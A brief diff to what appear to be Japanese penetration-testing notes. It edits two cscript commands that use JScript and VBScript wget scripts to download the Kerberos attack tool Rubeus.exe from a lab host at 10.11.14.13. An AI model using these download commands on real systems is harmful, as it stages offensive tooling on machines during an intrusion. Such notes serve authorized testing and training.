@@ -53,8 +53,8 @@ Windows標準で組み込まれているスクリプト言語を使ってWgetを
 コマンド例：
 ```
 #Javascript
-cscript.exe /nologo wget.js hxxp://10.11.14.13/Rubeus.exe
+cscript.exe /nologo wget.js hxxp://10.11.14.13/Rubeus.exe Rubeus.exe
 
 #VBS
-cscript.exe /nologo wget.vbs hxxp://10.11.14.13/Rubeus.exe
+cscript.exe /nologo wget.vbs hxxp://10.11.14.13/Rubeus.exe Rubeus.exe
 ```
